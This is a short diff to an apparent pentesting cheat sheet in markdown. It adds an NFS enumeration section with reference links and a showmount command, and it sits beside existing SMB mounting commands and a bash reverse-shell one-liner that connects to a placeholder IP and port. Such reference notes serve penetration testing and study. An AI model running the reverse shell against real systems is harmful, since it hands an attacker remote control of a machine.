@@ -87,6 +87,14 @@ smbclient //<IP>/share
 mount -t cifs //x.x.x.x/share /mnt/share
 ```
 
+## pentesting nfs
+```bash
+https://vk9-sec.com/2049-tcp-nfs-enumeration/
+https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
+
+# check exposed mounts
+showmount -e <IP>
+```
 ## reverse shell
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
